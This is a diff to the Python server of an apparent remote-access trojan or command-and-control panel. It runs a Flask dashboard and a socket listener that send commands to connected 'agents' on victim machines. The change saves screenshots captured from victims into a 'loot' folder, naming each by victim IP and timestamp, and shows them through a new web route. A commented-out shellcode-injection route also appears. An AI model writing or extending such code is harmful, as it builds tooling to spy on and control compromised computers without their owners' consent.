@@ -1,17 +1,19 @@
 from concurrent.futures import thread
 from gzip import READ
-
+import time,datetime
 from os import close
-import os
+import os,ctypes
+from PIL import ImageTk,Image  
+from tkinter import *
 import re
-import socket 
+import socket,tkinter
 import threading,time,flask
 from flask import *
 from pathlib import Path
 import base64
 import time,random,string 
 import zipfile
-
+import webbrowser,PIL
 
 ip_address = '0.0.0.0'
 port_number = 1234
@@ -142,11 +144,19 @@ def handle_connection(connection,address,thread_index):
                     connection.send(cmd.encode())
                     encodedimage = connection.recv(BUFFER_SIZE*100).decode()
                     imagebytes = base64.b64decode(encodedimage)
-                    
-                    f = open(".\\loot\\temp.jpg","wb")
+                    ts = time.time()
+                    timestamp = datetime.datetime.fromtimestamp(ts).strftime(r'%Y%m%d%H%M%S')
+                    filename = "".join(address[0].split("."))+"-"+timestamp
+                    f = open(".\\loot\\"+filename+".jpg","wb")
                     f.write(imagebytes)
                     f.close()
-                    CMD_OUTPUT[thread_index] = "Screenshot Captured"
+                    fullfilename =filename+".jpg"                    
+                    #temp = threading.Thread(target=showimage,args=(fullfilename,))
+                    #temp.start()
+                    #chrome_path=r'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'
+                    #webbrowser.register('chrome', None,webbrowser.BackgroundBrowser(chrome_path))
+                    #webbrowser.get(chrome_path).open_new("https://google.com")
+                    CMD_OUTPUT[thread_index] = fullfilename
                     CMD_INPUT[thread_index] = ""
 
 
@@ -545,15 +555,22 @@ def misc(agentname):
     for i in range(len(THREADS)):
         if agentname in THREADS[i].name:
             cmd_index = THREADS.index(THREADS[i])
-    if(request.args.get('cmd')!=None):
+    if request.args.get('cmd')!=None:
         cmd = request.args.get('cmd')
         CMD_INPUT[cmd_index] = cmd
-        time.sleep(3)
+        time.sleep(2)
         status = CMD_OUTPUT[cmd_index]
-        return render_template("misc.html",agentname=agentname,status=status)
+        if cmd=="Get-Screenshot":
+            pic=status
+        
+        return render_template("misc.html",agentname=agentname,status=status,pic=pic)
 
     return render_template("misc.html",agentname=agentname)
     
+
+@app.route("/loot/<imagename>")
+def send(imagename):
+    return send_from_directory("loot",imagename)
 
 '''@app.route("/<agentname>/injectshellcode",method=["GET","POST"])
 def injectshellcode(agentname):
